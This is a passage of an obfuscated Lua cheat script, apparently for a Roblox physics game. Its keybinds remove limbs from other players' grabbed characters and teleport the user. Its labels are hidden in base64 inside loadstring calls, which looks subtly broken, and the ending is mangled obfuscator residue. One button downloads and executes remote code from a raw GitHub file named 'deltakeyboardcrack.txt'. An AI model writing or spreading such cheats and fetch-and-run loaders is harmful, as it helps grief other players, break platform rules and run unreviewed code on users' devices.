    local tpEnabled = true

    Key2Group:CreateKeybind({
        Name = loadstring(base64decode("UmVtb3ZlIExlZnQgTGVn"))(),
        Flag = loadstring(base64decode("UmVtb3ZlTGVmdExlZw=="))(),
        Default = loadstring(base64decode("Tm9uZQ=="))(),
        Callback = function()
            if workspace:FindFirstChild('GrabParts') and workspace.GrabParts:FindFirstChild('GrabPart') then
                local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent
                if target and target:FindFirstChild('Left Leg') and target:FindFirstChild('Humanoid') and target.Humanoid:FindFirstChild('Ragdolled') then
                    if target.Humanoid.Ragdolled.Value then
                        local pos = target.Torso.CFrame
                        workspace.FallenPartsDestroyHeight = -100
                        target['Left Leg'].CFrame = CFrame.new(0, -1E3, 0)
                        task.wait(0.1)
                        target.Torso.CFrame = CFrame.new(0, -950, 0)
                        task.wait(0)
                        target.Torso.CFrame = pos
                    end
                end
            end
        end
    })

    Key2Group:CreateKeybind({
        Name = loadstring(base64decode("UmVtb3ZlIFJpZ2h0IExlZw=="))(),
        Flag = loadstring(base64decode("UmVtb3ZlUmlnaHRMZWc="))(),
        Default = loadstring(base64decode("Tm9uZQ=="))(),
        Callback = function()
            if workspace:FindFirstChild('GrabParts') and workspace.GrabParts:FindFirstChild('GrabPart') then
                local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent
                if target and target:FindFirstChild('Right Leg') and target:FindFirstChild('Humanoid') and target.Humanoid:FindFirstChild('Ragdolled') then
                    if target.Humanoid.Ragdolled.Value then
                        local pos = target.Torso.CFrame
                        workspace.FallenPartsDestroyHeight = -100
                        target['Right Leg'].CFrame = CFrame.new(0, -1E3, 0)
                        task.wait(0.1)
                        target.Torso.CFrame = CFrame.new(0, -950, 0)
                        task.wait(0)
                        target.Torso.CFrame = pos
                    end
                end
            end
        end
    })

    Key2Group:CreateKeybind({
        Name = loadstring(base64decode("UmVtb3ZlIExlZnQgQXJt"))(),
        Flag = loadstring(base64decode("UmVtb3ZlTGVmdEFybQ=="))(),
        Default = loadstring(base64decode("Tm9uZQ=="))(),
        Callback = function()
            if workspace:FindFirstChild('GrabParts') and workspace.GrabParts:FindFirstChild('GrabPart') then
                local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent
                if target and target:FindFirstChild('Left Arm') and target:FindFirstChild('Humanoid') and target.Humanoid:FindFirstChild('Ragdolled') then
                    if target.Humanoid.Ragdolled.Value then
                        local pos = target.Torso.CFrame
                        workspace.FallenPartsDestroyHeight = -100
                        target['Left Arm'].CFrame = CFrame.new(0, -1E3, 0)
                        task.wait(0.1)
                        target.Torso.CFrame = CFrame.new(0, -950, 0)
                        task.wait(0)
                        target.Torso.CFrame = pos
                    end
                end
            end
        end
    })

    Key2Group:CreateKeybind({
        Name = loadstring(base64decode("UmVtb3ZlIFJpZ2h0IEFybQ=="))(),
        Flag = loadstring(base64decode("UmVtb3ZlUmlnaHRBcm0="))(),
        Default = loadstring(base64decode("Tm9uZQ=="))(),
        Callback = function()
            if workspace:FindFirstChild('GrabParts') and workspace.GrabParts:FindFirstChild('GrabPart') then
                local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent
                if target and target:FindFirstChild('Right Arm') and target:FindFirstChild('Humanoid') and target.Humanoid:FindFirstChild('Ragdolled') then
                    if target.Humanoid.Ragdolled.Value then
                        local pos = target.Torso.CFrame
                        workspace.FallenPartsDestroyHeight = -100
                        target['Right Arm'].CFrame = CFrame.new(0, -1E3, 0)
                        task.wait(0.1)
                        target.Torso.CFrame = CFrame.new(0, -950, 0)
                        task.wait(0)
                        target.Torso.CFrame = pos
                    end
                end
            end
        end
    })

    KeybindsGroup:CreateKeybind({
        Name = loadstring(base64decode("VFAgdG8gU3Bhd24="))(),
        Flag = loadstring(base64decode("VFBfVG9TcGF3bg=="))(),
        Default = loadstring(base64decode("Tm9uZQ=="))(),
        Callback = function()
            local char = LocalPlayer.Character
            local hrp = char and char:FindFirstChild('HumanoidRootPart')
            if hrp then
                hrp.CFrame = CFrame.new(0, -5, 0)
            end
        end
    })

    KeybindsGroup:CreateKeybind({
        Name = loadstring(base64decode("TG9vcCBUUCBUb2dnbGU="))(),
        Flag = loadstring(base64decode("VFBfTG9vcFRvZ2dsZQ=="))(),
        Default = loadstring(base64decode("Tm9uZQ=="))(),
        Callback = function()
            if Toggles.LoopTpToggle then
                Toggles.LoopTpToggle:SetValue(not Toggles.LoopTpToggle:GetValue())
            end
        end
    })

    Key2Group:CreateButton({
        Name = loadstring(base64decode("TW9iaWxlIEtleWJvYXJk"))(),
        Callback = function()
            if not _G.MobileKeyboardLoaded then
                _G.MobileKeyboardLoaded = true
                loadstring(game:HttpGet('https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt', true))()
            end
        end
    })
end

print(loadstring(base64decode("anNqayBMb2FkZWQganNqayBlZHVhcmR6a2wgc28gZ29hdCB3d3c="))())

end
end
GJUNlTdH(6gAbC)
end)(...)
